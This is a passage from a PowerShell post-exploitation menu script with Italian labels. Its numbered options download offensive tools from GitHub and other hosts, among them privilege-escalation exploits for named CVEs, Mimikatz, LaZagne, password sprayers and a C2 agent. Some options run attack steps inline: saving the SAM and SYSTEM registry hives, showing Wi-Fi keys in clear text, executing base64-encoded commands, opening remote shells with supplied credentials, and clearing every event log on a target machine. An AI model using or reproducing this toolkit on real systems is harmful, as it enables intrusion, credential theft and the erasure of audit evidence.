        '0' {exit}
        '1' {Scarica "HarmJ0y/PowerUp/PowerUp" "PowerUp.ps1" "HarmJ0y/PowerUp/master/PowerUp.ps1"}
        '2' {Scarica "absolomb/WindowsEnum" "WindowsEnum.ps1" "absolomb/WindowsEnum/master/WindowsEnum.ps1"}
        '3' {Scarica "rasta-mouse/Sherlock/Sherlock" "Sherlock.ps1" "rasta-mouse/Sherlock/master/Sherlock.ps1"}
        '4' {Scarica "enjoiz/Privesc/privesc" "privesc.ps1" "enjoiz/Privesc/master/privesc.ps1"}
        '5' {Scarica "411Hall/JAWS/jaws-enum" "jaws-enum.ps1" "411Hall/JAWS/master/jaws-enum.ps1"}
        '6' {ScaricaBat "carlospolop/privilege-escalation-awesome-scripts-suite/winPEAS" "winPEAS.bat" "carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat"}
        '7' {Scarica "hausec/ADAPE-Script/ADAPE" "ADAPE.ps1" "hausec/ADAPE-Script/master/ADAPE.ps1"}
        '8' {write-host "you will get https://github.com/frizb/Windows-Privilege-Escalation"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "frizb/Windows-Privilege-Escalation/$FILENAME" "$FILENAME" "frizb/Windows-Privilege-Escalation/master/$FILENAME"}}
        '9' {ScaricaBat "mattiareggiani/WinEnum" "WinEnum.bat" "mattiareggiani/WinEnum/master/WinEnum.bat"}
        '10' {write-host 'you will get https://github.com/offensive-security/exploitdb - windows_x86/local'; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "offensive-security/exploitdb/master/exploits/windows_x86/local/$FILENAME" "$FILENAME" "offensive-security/exploitdb/master/exploits/windows_x86/local/$FILENAME"}}
        '11' {write-host "you will get https://github.com/offensive-security/exploitdb - windows_x64/local"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "offensive-security/exploitdb/master/exploits/windows_x86-64/local/$FILENAME" "$FILENAME" "offensive-security/exploitdb/master/exploits/windows_x86-64/local/$FILENAME"}}
        '12' {write-host "you will get https://github.com/samratashok/nishang/tree/master/Escalation"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/Escalation/$FILENAME" "$FILENAME" "samratashok/nishang/master/Escalation/$FILENAME"}}
        '13' {write-host "you will get https://github.com/samratashok/nishang/tree/master/ActiveDirectory"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/ActiveDirectory/$FILENAME" "$FILENAME" "samratashok/nishang/master/ActiveDirectory/$FILENAME"}}
        '14' {write-host "you will get https://github.com/samratashok/nishang/tree/master/Backdoors"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/Backdoors/$FILENAME" "$FILENAME" "samratashok/nishang/master/Backdoors/$FILENAME"}}
        '15' {write-host "you will get https://github.com/samratashok/nishang/tree/master/Bypass"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/Bypass/$FILENAME" "$FILENAME" "samratashok/nishang/master/Bypass/$FILENAME"}}
        '16' {write-host "you will get https://github.com/samratashok/nishang/tree/master/Gather"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/Gather/$FILENAME" "$FILENAME" "samratashok/nishang/master/Gather/$FILENAME"}}
        '17' {write-host "you will get https://github.com/samratashok/nishang/tree/master/Scan"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/Scan/$FILENAME" "$FILENAME" "samratashok/nishang/master/Scan/$FILENAME"}}
        '18' {write-host "you will get https://github.com/samratashok/nishang/tree/master/powerpreter"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/powerpreter/$FILENAME" "$FILENAME" "samratashok/nishang/master/powerpreter/$FILENAME"}}
        '19' {write-host "you will get https://github.com/FuzzySecurity/PowerShell-Suite"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "FuzzySecurity/PowerShell-Suite/$FILENAME" "$FILENAME" "FuzzySecurity/PowerShell-Suite/master/$FILENAME"}}
        '20' {ScaricaSSL "WindowsExploits/CVE-2012-0217/sysret" "sysret.exe" "WindowsExploits/Exploits/raw/master/CVE-2012-0217/Binaries/sysret.exe"}
        '21' {ScaricaSSL "WindowsExploits/CVE-2016-3309/bfill" "bfill.exe" "WindowsExploits/Exploits/raw/master/CVE-2016-3309/Binaries/bfill.exe"}
        '22' {ScaricaSSL "WindowsExploits/CVE-2016-3371/40429" "40429.exe" "WindowsExploits/Exploits/raw/master/CVE-2016-3371/Binaries/40429.exe"}
        '23' {Scarica "WindowsExploits/CVE-2016-7255/CVE-2016-7255" "CVE-2016-7255.ps1" "WindowsExploits/Exploits/master/CVE-2016-7255/CVE-2016-7255.ps1"}
        '24' {ScaricaSSL "WindowsExploits/CVE-2017-0213/CVE-2017-0213_x86" "CVE-2017-0213_x86.zip" "WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x86.zip"}
        '25' {ScaricaSSL "WindowsExploits/CVE-2017-0213/CVE-2017-0213_x64" "CVE-2017-0213_x64.zip" "WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip"}
        '26' {write-host "you will get https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "EmpireProject/Empire/privesc/$FILENAME" "$FILENAME" "EmpireProject/Empire/master/data/module_source/privesc/$FILENAME"}}
        '27' {write-host "you will get https://github.com/EmpireProject/Empire/tree/master/data/module_source/exploitation"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "EmpireProject/Empire/exploitation/$FILENAME" "$FILENAME" "EmpireProject/Empire/master/data/module_source/exploitation/$FILENAME"}}
        '28' {Scarica "hausec/PowerZure" "PowerZure.ps1" "hausec/PowerZure/master/PowerZure.ps1"}
        '29' {Scarica "itm4n/PrivescCheck" "Invoke-PrivescCheck.ps1" "itm4n/PrivescCheck/master/Invoke-PrivescCheck.ps1"}
        '30' {ScaricaExt "sysinternals/NotMyFault" "notmyfault.zip" "https://download.sysinternals.com/files/NotMyFault.zip"}
        '31' {ScaricaExt "sysinternals/Procdump" "procdump.zip" "https://download.sysinternals.com/files/Procdump.zip"}
        '32' {ScaricaExt "sysinternals/PSTools" "pstools.zip" "https://download.sysinternals.com/files/PSTools.zip"}
        '33' {ScaricaExt "eternallybored.org/netcat-win32-1.12" "netcat-win32-1.12.zip" "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"}
        '34' {ScaricaSSL "T3rry7f/ICMPTunnel/IcmpTunnel_C" "IcmpTunnel_C.exe" "T3rry7f/ICMPTunnel/raw/master/IcmpTunnel_C.exe"}
        '35' {ScaricaSSL "T3rry7f/ICMPTunnel/IcmpTunnel_C_64" "IcmpTunnel_C_64.exe" "T3rry7f/ICMPTunnel/raw/master/IcmpTunnel_C_64.exe"}
        '36' {Scarica "threatexpress/Invoke-PipeShell" "Invoke-PipeShell.ps1" "threatexpress/invoke-pipeshell/master/Invoke-PipeShell.ps1"}
        '37' {Scarica "mdavis332/DomainPasswordSpray/Invoke-DomainPasswordSpray" "Invoke-DomainPasswordSpray.ps1" "mdavis332/DomainPasswordSpray/master/public/Invoke-DomainPasswordSpray.ps1"}
        '38' {Scarica "mdavis332/DomainPasswordSpray/Get-DomainPasswordPolicy" "Get-DomainPasswordPolicy.ps1" "mdavis332/DomainPasswordSpray/master/private/Get-DomainPasswordPolicy.ps1"}
        '39' {Scarica "mdavis332/DomainPasswordSpray/Get-DomainUserList" "Get-DomainUserList.ps1" "mdavis332/DomainPasswordSpray/master/private/Get-DomainUserList.ps1"}
        '40' {write-host "you will get https://github.com/mattifestation/PowerShellArsenal/Disassembly"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "mattifestation/PowerShellArsenal/Disassembly/$FILENAME" "$FILENAME" "mattifestation/PowerShellArsenal/master/Disassembly/$FILENAME"}}
        '41' {write-host "you will get https://github.com/mattifestation/PowerShellArsenal/MemoryTools"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "mattifestation/PowerShellArsenal/MemoryTools/$FILENAME" "$FILENAME" "mattifestation/PowerShellArsenal/master/MemoryTools/$FILENAME"}}
        '42' {write-host "you will get https://github.com/mattifestation/PowerShellArsenal/Misc"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "mattifestation/PowerShellArsenal/Misc/$FILENAME" "$FILENAME" "mattifestation/PowerShellArsenal/master/Misc/$FILENAME"}}
        '43' {write-host "you will get https://github.com/mattifestation/PowerShellArsenal/Parsers"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "mattifestation/PowerShellArsenal/Parsers/$FILENAME" "$FILENAME" "mattifestation/PowerShellArsenal/master/Parsers/$FILENAME"}}
        '44' {write-host "you will get https://github.com/mattifestation/PowerShellArsenal/WindowsInternals"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "mattifestation/PowerShellArsenal/WindowsInternals/$FILENAME" "$FILENAME" "mattifestation/PowerShellArsenal/master/WindowsInternals/$FILENAME"}}
        '45' {write-host "you will get https://github.com/andrew-d/static-binaries/windows/x86"; $FILENAME=read-host 'Digit filename with extension (example nmap.exe)'; if($FILENAME -ne ""){write-host "downloading andrew-d/static-binaries/windows/x86/$FILENAME"; try{invoke-webrequest -uri https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/$FILENAME -outfile $FILENAME}catch{write-host $_}}else{write-host $FILENAME" is not a valid name"}}
        '46' {write-host "you will get https://github.com/andrew-d/static-binaries/windows/x64"; $FILENAME=read-host 'Digit filename with extension (example heartbleeder.exe)'; if($FILENAME -ne ""){write-host "downloading andrew-d/static-binaries/windows/x64/$FILENAME"; try{invoke-webrequest -uri https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x64/$FILENAME -outfile $FILENAME}catch{write-host $_}}else{write-host $FILENAME" is not a valid name"}}
        '47' {ScaricaExt "nmap.org/nmap-7.80-win32" "nmap-7.80-win32.zip" "https://nmap.org/dist/nmap-7.80-win32.zip"}
        '48' {Scarica "3gstudent/Homework-of-Powershell/Invoke-DomainPasswordSprayOutsideTheDomain" "Invoke-DomainPasswordSprayOutsideTheDomain.ps1" "3gstudent/Homework-of-Powershell/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1"}
        '49' {write-host "you will get https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "PowerShellMafia/PowerSploit/Recon/$FILENAME" "$FILENAME" "PowerShellMafia/PowerSploit/master/Recon/$FILENAME"}}
        '50' {Scarica "BloodHoundAD/Ingestors/SharpHound" "SharpHound.ps1" "BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1"}
        '51' {write-host "you will get https://github.com/PyroTek3/PowerShell-AD-Recon"; $FILENAME=read-host 'Digit filename without extension (example exploit)'; if($FILENAME -ne ""){Scarica "PyroTek3/PowerShell-AD-Recon/$FILENAME" "$FILENAME" "PyroTek3/PowerShell-AD-Recon/master/$FILENAME"}}
        '52' {Scarica "vletoux/smbscanner" "smbscanner.ps1" "vletoux/SmbScanner/master/smbscanner.ps1"}
        '53' {Scarica "sperner/PowerShell/Sniffer" "Sniffer.ps1" "sperner/PowerShell/master/Sniffer.ps1"}
        '54' {Scarica "klemmestad/PowerShell/SNMP/MAXFocus_SNMP_Checks" "MAXFocus_SNMP_Checks.ps1" "klemmestad/PowerShell/master/SNMP/MAXFocus_SNMP_Checks.ps1"}
        '55' {write-host "you will get https://github.com/InfosecMatter/Minimalistic-offensive-security-tools"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "InfosecMatter/Minimalistic-offensive-security-tools/$FILENAME" "$FILENAME" "InfosecMatter/Minimalistic-offensive-security-tools/master/$FILENAME"}}
        '56' {Scarica "TsukiCTF/Lovely-Potato/Invoke-LovelyPotato" "Invoke-LovelyPotato.ps1" "TsukiCTF/Lovely-Potato/master/Invoke-LovelyPotato.ps1"}
        '57' {ScaricaSSL "TsukiCTF/Lovely-Potato/JuicyPotato-Static" "JuicyPotato-Static.exe" "TsukiCTF/Lovely-Potato/raw/master/JuicyPotato-Static.exe"}
        '58' {ScaricaSSL "PrateekKumarSingh/AzViz" "AzViz.zip" "PrateekKumarSingh/AzViz/archive/master.zip"}
        '59' {Scarica "mvelazc0/Invoke-SMBLogin" "Invoke-SMBLogin.ps1" "mvelazc0/Invoke-SMBLogin/master/Invoke-SMBLogin.ps1"}
        '60' {write-host "PrintDemon PrivEsc"; Add-PrinterPort -Name C:\Windows\System32\ualapi.dll}
        '61' {Scarica "xtr4nge/FruityC2/agent" "ps_agent.ps1" "xtr4nge/FruityC2/master/agent/ps_agent.ps1"; Scarica "xtr4nge/FruityC2/agent" "ps_proxy.ps1" "xtr4nge/FruityC2/master/agent/ps_proxy.ps1"; Scarica "xtr4nge/FruityC2/agent" "ps_stager.ps1" "xtr4nge/FruityC2/master/agent/ps_stager.ps1"}
        '90' {(dir *.zip).Name; $NOME=read-host "Digit a zip file to extract"; if($NOME -ne "" -and $NOME.EndsWith(".zip")){if(Test-Path $NOME){[System.IO.Compression.ZipFile]::ExtractToDirectory($NOME, $NOME.Replace(".zip", ""))}else{write-host $NOME" does not exist"}}else{write-host "ERROR: empty field or it is not a zip file"}}
        '91' {write-host "Digit first three IPv4 Values dotted"; $IP=read-host "(example, 192.168.168)"; if($IP -ne ""){for ($RANGE = 0; $RANGE -lt 256; $RANGE++){$IPT="$IP.$RANGE"; Write-Host -NoNewLine "`rTest $IPT`r"; try{if((Test-Connection "$IPT" -Quiet -Count 1)){write-host "$IPT found"}}catch{}}}}
        '99' {write-host "Download a file"; write-host "Digit URI/URL and filename with extension"; $FILENAME=read-host "(example http://192.168.1.100/exploit.ps1)"; if($FILENAME -ne ""){write-host "downloading $FILENAME"; try{invoke-webrequest -uri $FILENAME -outfile $FILENAME;}catch{write-host $_}}}
        '100' {write-host "sharing "(Get-Location); net share DataShare=(Get-Location)}
        '101' {$NOME=read-host "Digit a sharing name (example SmbHacked)"; if($NOME -ne ""){write-host "sharing "(Get-Location); New-SmbShare -Path (Get-Location) -Name $NOME}}
        '102' {$User=read-host 'Digit target Domain\\Username'; $Passwd=read-host "Digit target User's password plaintext"; if($User -ne "" -and $Passwd -ne ""){$SecPass = ConvertTo-SecureString $Passwd -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential $User,$SecPass;}}
        '103' {if($Cred -ne $null){write-host "Digit Uri target, optionally with remote port"; $TARGET=read-host "(example, http://localhost:5432)"; if($TARGET -ne ""){try{New-PSSession -Uri $TARGET -Credential $Cred}catch{write-host $_}}else{write-host "Digit a valid Uri"}}else{write-host "PSCredentials are null, please select 102 and create them"}}
        '104' {Scarica "InfosecMatter/SSH-PuTTY-login-bruteforcer" "ssh-putty-brute.ps1" "InfosecMatter/SSH-PuTTY-login-bruteforcer/master/ssh-putty-brute.ps1"}
        '105' {$BASE=read-host "Paste utf16 encoded base64 text"; if($BASE -ne ""){[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($BASE)) | Out-File -FilePath .\filedecoded.txt; write-host "base64 text encoded amd piped to file named filedecoded.txt"}}
        '106' {$BASE=read-host "Paste utf16 encoded base64 text"; if($BASE -ne ""){powershell.exe -EncodedCommand $BASE}}
        '107' {$CMD=read-host "Digit a block of commands"; $COMNAME=read-host "Digit a Computer name"; if($CMD -ne ""){if($COMNAME -ne ""){Invoke-Command -ComputerName $COMNAME -Credential $Cred -ScriptBlock {$CMD}}}}
        '108' {(dir *.psm1).Name; $MODULO=read-host 'Digit a module to import in this path or * for all modules'; if($MODULO -ne ""){try{if($MODULO -eq "*"){Get-ChildItem -Path (Get-Location) -Filter *.psm1 | ForEach-Object -Process { Import-Module $PSItem.FullName}}else{if($MODULO.EndsWith(".psm1")){if(Test-Path $MODULO){Import-Module $MODULO}else{write-host $MODULO" does not exist"}}else{write-host $MODULO" is not a Powershell module"}}}catch{write-host $_}}else{write-host "vuoto"}}
        '109' {write-host "you will get https://github.com/TonyPhipps/Meerkat/tree/master/Modules"; $FILENAME=read-host 'Digit filename with extension (example exploit.psm1)'; if($FILENAME -ne ""){Scarica "TonyPhipps/Meerkat/Modules/$FILENAME" "$FILENAME" "TonyPhipps/Meerkat/master/Modules/$FILENAME"}}
        '110' {cmd.exe /c 'mkdir %SystemDrive%\BypassDir\cscript.exe && copy %windir%\System32\wscript.exe %SystemDrive%\BypassDir\cscript.exe\winword.exe && %SystemDrive%\BypassDir\cscript.exe\winword.exe //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty > winrm-report.txt'}
        '111' {netsh wlan show profiles; write-host "digit a wlan profile name"; $NOME=read-host "profile name: "; cmd.exe /c "netsh wlan show profile $NOME key=clear"}
        '112' {Scarica "HarmJ0y/Misc-PowerShell/Invoke-WdigestDowngrade" "Invoke-WdigestDowngrade.ps1" "HarmJ0y/Misc-PowerShell/master/Invoke-WdigestDowngrade.ps1"}
        '113' {cmd.exe /c reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages" > SecPack.txt}
        '114' {cmd.exe /c 'reg save hklm\sam c:\sam && reg save hklm\system c:\system'}
        '115' {Scarica "EmpireProject/Empire/credentials/Invoke-PowerDump" "Invoke-PowerDump.ps1" "EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1"}
        '116' {write-host "downloading PS-NTDSUTIL"; try{invoke-webrequest -uri https://gallery.technet.microsoft.com/scriptcenter/PS-NTDSUTIL-b7e9e815/file/92879/1/PS-NTDSUTIL.ps1 -outfile PS-NTDSUTIL.ps1.tmp; get-content -path PS-NTDSUTIL.ps1.tmp | set-content -encoding default -path PS-NTDSUTIL.ps1; remove-item -path PS-NTDSUTIL.ps1.tmp}catch{write-host $_}}
        '117' {write-host "downloading Get-MemoryDump"; try{invoke-webrequest -uri https://gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump-c5ab38d8/file/73433/1/Get-MemoryDump.ps1 -outfile Get-MemoryDump.ps1.tmp; get-content -path Get-MemoryDump.ps1.tmp | set-content -encoding default -path Get-MemoryDump.ps1; remove-item -path Get-MemoryDump.ps1.tmp}catch{write-host $_}}
        '118' {Scarica "peewpw/Invoke-WCMDump" "Invoke-WCMDump.ps1" "peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1"}
        '119' {Scarica "clymb3r/Invoke-Mimikatz" "Invoke-Mimikatz.ps1" "clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1"}
        '120' {write-host "you will get https://github.com/sperner/PowerShell"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "sperner/PowerShell/$FILENAME" "$FILENAME" "sperner/PowerShell/master/$FILENAME"}}
        '121' {Scarica "kfosaaen/Get-LAPSPasswords" "Get-LAPSPasswords.ps1" "kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1"}
        '122' {Scarica "dafthack/DomainPasswordSpray" "DomainPasswordSpray.ps1" "dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1"}
        '123' {Scarica "NetSPI/PS_MultiCrack" "PS_MultiCrack.ps1" "NetSPI/PS_MultiCrack/master/PS_MultiCrack.ps1"}
        '124' {Scarica "securethelogs/PSBruteZip" "PSBruteZip.ps1" "securethelogs/PSBruteZip/master/PSBruteZip.ps1"}
        '125' {write-host "you will get https://github.com/Kevin-Robertson/Invoke-TheHash"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "Kevin-Robertson/Invoke-TheHash/$FILENAME" "$FILENAME" "Kevin-Robertson/Invoke-TheHash/master/$FILENAME"}}
        '126' {write-host "you will get https://github.com/HarmJ0y/Misc-PowerShell"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "HarmJ0y/Misc-PowerShell/$FILENAME" "$FILENAME" "HarmJ0y/Misc-PowerShell/master/$FILENAME"}}
        '127' {Scarica "PowerShellMafia/PowerSploit/Get-System" "Get-System.ps1" "PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1"}
        '128' {write-host "you will get https://github.com/scipag/PowerShellUtilities"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "scipag/PowerShellUtilities/$FILENAME" "$FILENAME" "scipag/PowerShellUtilities/master/$FILENAME"}}
        '129' {ScaricaSSL "nsacyber/Pass-the-Hash-Guidance" "Pass-the-Hash-Guidance.zip" "nsacyber/Pass-the-Hash-Guidance/archive/master.zip"}
        '130' {Scarica "0xm4v3rick/Extract-Macro" "Extract-Macro.ps1" "0xm4v3rick/Extract-Macro/master/Extract-Macro.ps1"}
        '131' {Scarica "enigma0x3/Generate-Macro" "Generate-Macro.ps1" "enigma0x3/Generate-Macro/master/Generate-Macro.ps1"}
        '132' {ScaricaSSL "AlessandroZ/LaZagne" "lazagne.exe" "AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe"}
        '133' {ScaricaBat "ZecOps/CVE-2020-0796-RCE-POC/calc_target_offsets" "calc_target_offsets.bat" "ZecOps/CVE-2020-0796-RCE-POC/master/calc_target_offsets.bat"}
        '134' {Scarica "nidem/kerberoast/GetUserSPNs" "GetUserSPNs.ps1" "nidem/kerberoast/master/GetUserSPNs.ps1"}
        '135' {$IPT=read-host 'Digit the IP target'; $USRT=read-host 'Digit Domain\User target'; $PASST=read-host 'Digit the password of target User'; if($IPT -ne ""){if($USRT -ne ""){if($PASST -ne ""){Enable-PSRemoting –force; winrm quickconfig -transport:https; Set-Item wsman:\localhost\client\trustedhosts * ; Restart-Service WinRM; winrs -r:$IPT -u:$USRT -p:$PASST cmd}}}}
        '140' {write-host "Ensure lockout threshold < AD lockout"; try{Get-AdfsProperties | fl ExtranetLockoutEnabled,ExtranetLockoutthreshold,ExtranetObservationWindow}catch{write-host $_}}
        '141' {write-host "Set to >1 years"; try{Get-ADFSProperties | Select CertificateDuration; Write-Output "ADFS Server Logging Level:"; (Get-AdfsProperties).LogLevel}catch{write-host $_}}
        '142' {write-host "Check Server Core"; try{$regKey = "hklm:/software/microsoft/windows nt/currentversion"; $SrvCore = (Get-ItemProperty $regKey).InstallationType; if($SrvCore -eq "Server Core"){write-host "Server Core: True"}else{write-host "Server Core: False"}}catch{write-host $_}}
        '143' {Scarica "FuzzySecurity/PowerShell-Suite/Bypass-UAC" "Bypass-UAC.ps1" "FuzzySecurity/PowerShell-Suite/master/Bypass-UAC/Bypass-UAC.ps1"}
        '144' {Scarica "Kevin-Robertson/Inveigh/master/Inveigh-Relay" "Inveigh-Relay.ps1" "Kevin-Robertson/Inveigh/master/Inveigh-Relay.ps1"}
        '145' {Scarica "Nillth/PWSH-LDAP/LDAP-Query" "LDAP-Query.ps1" "Nillth/PWSH-LDAP/master/LDAP-Query.ps1"}
        '146' {write-host "you will get https://github.com/3gstudent/List-RDP-Connections-History"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "3gstudent/List-RDP-Connections-History/$FILENAME" "$FILENAME" "3gstudent/List-RDP-Connections-History/master/$FILENAME"}}
        '147' {ScaricaSSL "dinigalab/ldapsearch" "ldapsearch.exe" "dinigalab/ldapsearch/raw/master/ldapsearch.exe"}
        '148' {ScaricaSSL "NetSPI/PowerUpSQL" "PowerUpSQL.zip" "NetSPI/PowerUpSQL/archive/master.zip"}
        '149' {cmd.exe /c REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300}
        '150' {Scarica "HarmJ0y/ASREPRoast" "ASREPRoast.ps1" "HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"}
        '151' {Scarica "Kevin-Robertson/Tater" "Tater.ps1" "Kevin-Robertson/Tater/master/Tater.ps1"}
        '152' {Scarica "Kevin-Robertson/Powermad" "Powermad.ps1" "Kevin-Robertson/Powermad/master/Powermad.ps1"; Scarica "Kevin-Robertson/Powermad/Invoke-DNSUpdate" "Invoke-DNSUpdate.ps1" "Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1"}
        '153' {Scarica "hausec/PowerZure" "PowerZure.ps1" "hausec/PowerZure/master/PowerZure.ps1"}
        '154' {ScaricaSSL "HarmJ0y/Invoke-Obfuscation" "Invoke-Obfuscation.zip" "HarmJ0y/Invoke-Obfuscation/archive/master.zip"}
        '155' {Scarica "HarmJ0y/WINspect" "WINspect.ps1" "HarmJ0y/WINspect/master/WINspect.ps1"}
        '156' {Scarica "AlsidOfficial/UncoverDCShadow" "UncoverDCShadow.ps1" "AlsidOfficial/UncoverDCShadow/master/UncoverDCShadow.ps1"}
        '157' {ScaricaBat "clr2of8/parse-net-users-bat" "parse-net-users-bat.bat" "clr2of8/fcf9ee60f0e92663dc224e876f1615af/raw/0487659a20588a5b933bcb75b3a3c378affc3e17/parse-net-users-bat.bat"}
        '158' {Scarica "davehardy20/Invoke-WinRMAttack" "Invoke-WinRMAttack.psm1" "davehardy20/Invoke-WinRMAttack/master/Invoke-WinRMAttack.psm1"}
        '159' {Scarica "d1pakda5/PowerShell-for-Pentesters/Code/44/Get-WinRMPassword" "Get-WinRMPassword.ps1" "d1pakda5/PowerShell-for-Pentesters/master/Code/44/Get-WinRMPassword.ps1"}
        '160' {write-host "you will get https://github.com/S3cur3Th1sSh1t/WinPwn"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "S3cur3Th1sSh1t/WinPwn/$FILENAME" "$FILENAME" "S3cur3Th1sSh1t/WinPwn/master/$FILENAME"}}
        '161' {Scarica "Arvanaghi/SessionGopher" "SessionGopher.ps1" "Arvanaghi/SessionGopher/master/SessionGopher.ps1"}
        '162' {ScaricaSSL "giMini/PowerMemory" "PowerMemory.zip" "giMini/PowerMemory/archive/master.zip"}
        '163' {write-host "you will get https://github.com/Kevin-Robertson/Inveigh"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "Kevin-Robertson/Inveigh/$FILENAME" "$FILENAME" "Kevin-Robertson/Inveigh/master/$FILENAME"}}
        '164' {Scarica "hlldz/Invoke-Phant0m" "Invoke-Phant0m.ps1" "hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1"}
        '165' {Scarica "leoloobeek/LAPSToolkit" "LAPSToolkit.ps1" "leoloobeek/LAPSToolkit/master/LAPSToolkit.ps1"}
        '166' {Scarica "sense-of-security/ADRecon" "ADRecon.ps1" "sense-of-security/ADRecon/master/ADRecon.ps1"}
        '167' {Scarica "xorrior/RemoteRecon" "RemoteRecon.ps1" "xorrior/RemoteRecon/master/RemoteRecon.ps1"}
        '168' {ScaricaSSL "netbiosX/Digital-Signature-Hijack" "Digital-Signature-Hijack.zip" "netbiosX/Digital-Signature-Hijack/archive/master.zip"}
        '169' {Scarica "deepzec/Win-PortFwd" "win-portfwd.ps1" "deepzec/Win-PortFwd/master/win-portfwd.ps1"}
        '170' {ScaricaExt "sysinternals/ProcessExplorer" "ProcessExplorer.zip" "https://download.sysinternals.com/files/ProcessExplorer.zip"}
        '171' {ScaricaSSL "processhacker/processhacker" "processhacker-2.39-bin.zip" "processhacker/processhacker/releases/download/v2.39/processhacker-2.39-bin.zip"}
        '172' {ScaricaExt "sysinternals/ProcessMonitor" "ProcessMonitor.zip" "https://download.sysinternals.com/files/ProcessMonitor.zip"}
        '173' {ScaricaExt "sysinternals/Autoruns" "Autoruns.zip" "https://download.sysinternals.com/files/Autoruns.zip"}
        '174' {ScaricaExt "sysinternals/TCPView" "TCPView.zip" "https://download.sysinternals.com/files/TCPView.zip"}
        '175' {write-host "Digit the computername to which clear logs"; $COMNAME=read-host '(empty field or digit localhost for this computer)'; if($COMNAME -ne "" -and $COMNAME -ne "localhost"){$logs = Get-EventLog -ComputerName $COMNAME -List | ForEach-Object {$_.Log}; $logs | ForEach-Object {Clear-EventLog -ComputerName $COMNAME -LogName $_ }}else{$logs = Get-EventLog -List | ForEach-Object {$_.Log}; $logs | ForEach-Object {Clear-EventLog -LogName $_ }}}
        '176' {ScaricaSSL "cyberark/DLLSpy-x64" "DLLSpy.exe" "cyberark/DLLSpy/raw/master/x64/Release/DLLSpy.exe"}
        '177' {ScaricaSSL "rapid7/DLLHijackAuditKit" "DLLHijackAuditKit.zip" "rapid7/DLLHijackAuditKit/archive/master.zip"}
        '178' {ScaricaSSL "nolvis/nolvis-cobol-tool/CobolTool" "CobolTool.exe" "nolvis/nolvis-cobol-tool/raw/master/Ejecutables/CobolTool.exe"}
        '179' {Scarica "FuzzySecurity/PowerShell-Suite/Bypass-UAC" "Bypass-UAC.ps1" "FuzzySecurity/PowerShell-Suite/master/Bypass-UAC/Bypass-UAC.ps1"}
